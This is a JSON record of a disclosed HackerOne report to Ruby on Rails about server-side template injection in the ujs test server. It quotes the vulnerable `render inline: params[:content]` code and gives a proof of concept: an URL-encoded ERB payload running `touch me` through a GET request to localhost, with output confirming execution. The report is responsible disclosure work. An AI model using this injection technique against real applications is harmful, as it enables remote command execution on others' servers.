{
  "id": 942103,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDIxMDM=",
  "url": "https://hackerone.com/reports/942103",
  "title": "Server-side template injection at ujs test server",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "none",
  "readable_substate": "Resolved",
  "created_at": "2020-07-25T05:56:19.394Z",
  "submitted_at": "2020-07-25T05:56:19.394Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ooooooo_q",
    "url": "/ooooooo_q",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22,
    "url": "https://hackerone.com/rails",
    "handle": "rails",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby on Rails",
      "twitter_handle": "rails",
      "website": "http://rubyonrails.org/security",
      "about": "Web development that doesn't hurt."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-02-16T13:22:47.812Z",
  "bug_reporter_agreed_on_going_public_at": "2021-01-17T13:22:46.698Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I have found in the server code for testing ujs in Rails that template injection is possible and that leads to rce.\n\n\n### code\n\n\nhttps://github.com/rails/rails/blob/v6.0.3.2/actionview/test/ujs/server.rb\n\n```ruby\nmodule UJS\n  class Server < Rails::Application\n    routes.append do\n      get \"/rails-ujs.js\" => Blade::Assets.environment\n      get \"/\" => \"tests#index\"\n      match \"/echo\" => \"tests#echo\", via: :all\n      get \"/error\" => proc { |env| [403, {}, []] }\n    end\n\n...\n\nclass TestsController < ActionController::Base\n  helper TestsHelper\n  layout \"application\"\n\n  def index\n    render :index\n  end\n\n  def echo\n    data = { params: params.to_unsafe_h }.update(request.env)\n\n    if params[:content_type] && params[:content]\n      render inline: params[:content], content_type: params[:content_type]    \n```\n\n`render inline: params[:content]` receives the request value directly and can be executed as ERB code as it is, so it becomes template injection. (https://guides.rubyonrails.org/layouts_and_rendering.)html#using-render-with-inline\n\n\n### PoC\n\nPrepare Server.\n\n```\n❯ git clone https://github.com/rails/rails.git\n❯ cd rails/actionview\n\n❯ git rev-parse HEAD\n0fb6993f48bb01a960316027675f3f496baa2088\n\n❯ bundle install\n...\n\n❯ rake ujs:server\nPuma starting in single mode...\n* Version 4.3.1 (ruby 2.7.1-p83), codename: Mysterious Traveller\n* Min threads: 0, max threads: 16\n* Environment: development\n* Listening on tcp://127.0.0.1:4567\n* Listening on tcp://[::1]:4567\nUse Ctrl-C to stop\n```\n\nPrepare Attack code.\n\n```js\nencodeURIComponent(\"<% `touch me` %>\")\n> \"%3C%25%20%60touch%20me%60%20%25%3E\"\n```\n\nOpen url\n\n```\nhttp://localhost:4567/echo?content_type=test&content=%3C%25%20%60touch%20me%60%20%25%3E\n```\n\nAccess url with browser or curl\n\n```\n❯ ls me\nme\n```\n\n## Impact\n\nSince the attack code can be sent as a GET request, an attacker can attack a device running a test server for ujs from the external network by inducing a trap site.\nHowever, since this is a server used for testing rails development, it does not seem to have a significant impact on users.",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-02-16T13:22:46.756Z",
  "allow_singular_disclosure_after": -94350488.46303016,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "term1nal",
    "sa1tama0",
    "iamcoolcat",
    "vvip1337"
  ],
  "severity": {
    "rating": "none",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 160,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/rails/rails",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
